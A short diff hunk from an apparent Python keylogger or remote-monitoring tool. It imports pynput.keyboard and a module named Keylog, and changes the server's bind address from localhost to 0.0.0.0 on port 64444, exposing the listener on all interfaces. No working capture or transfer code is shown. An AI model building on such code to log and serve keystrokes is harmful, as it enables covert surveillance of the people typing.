@@ -16,7 +16,7 @@ import pynput.keyboard
 import Program
 import Keylog
 
-HOST = 'localhost'
+HOST = '0.0.0.0'
 PORT = 64444
 img_bytes = b'\x00\x01\x02...'
 
